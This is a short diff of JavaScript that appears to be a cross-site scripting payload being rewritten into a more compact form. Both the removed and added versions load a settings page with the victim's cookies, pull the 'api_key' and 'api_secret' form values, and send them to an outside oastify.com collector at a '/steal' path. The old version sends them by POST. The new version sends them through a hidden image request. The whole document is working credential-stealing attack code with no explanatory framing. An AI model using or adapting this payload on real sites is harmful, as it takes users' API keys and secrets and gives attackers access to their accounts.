@@ -1,17 +1,10 @@
-fetch("/client/settings/configuration", {
-  credentials: "include"
-})
-  .then(res => res.text())
-  .then(html => {
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, "text/html");
-
-    const apiKey = doc.querySelector('input[name="api_key"]')?.value;
-    const apiSecret = doc.querySelector('input[name="api_secret"]')?.value;
-
-    fetch("https://2y1jtx1vezcek1lbfgr5zkmhw82zqqef.oastify.com/steal", {
-      method: "POST",
-      body: JSON.stringify({ apiKey, apiSecret }),
-      headers: { "Content-Type": "application/json" }
-    });
+fetch("/client/settings/configuration", {credentials:"include"})
+  .then(r=>r.text())
+  .then(h=>{
+    let d=new DOMParser().parseFromString(h,"text/html");
+    let k=d.querySelector('input[name="api_key"]')?.value;
+    let s=d.querySelector('input[name="api_secret"]')?.value;
+    if(k&&s){
+      new Image().src=`https://2v1jtx1vezcek1lbfgr5zkmhw82zqqef.oastify.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
+    }
   });
